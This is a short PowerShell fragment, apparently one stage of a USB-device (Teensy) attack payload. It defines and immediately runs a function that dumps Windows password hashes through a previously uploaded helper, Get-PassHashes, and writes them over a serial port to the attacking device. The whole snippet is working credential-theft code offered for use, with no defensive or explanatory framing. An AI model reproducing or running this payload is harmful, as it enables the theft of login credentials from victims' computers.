function Run-HashDump {
#port should already be defined and opened by stage payload
$port.WriteLine("HASHSTART")
Get-PassHashes #part of uploaded helper functions, declared before stager.
$port.WriteLine($pastehashes)
$port.WriteLine("HASHEND")
} Run-HashDump #again deferring execution until teensy can prep
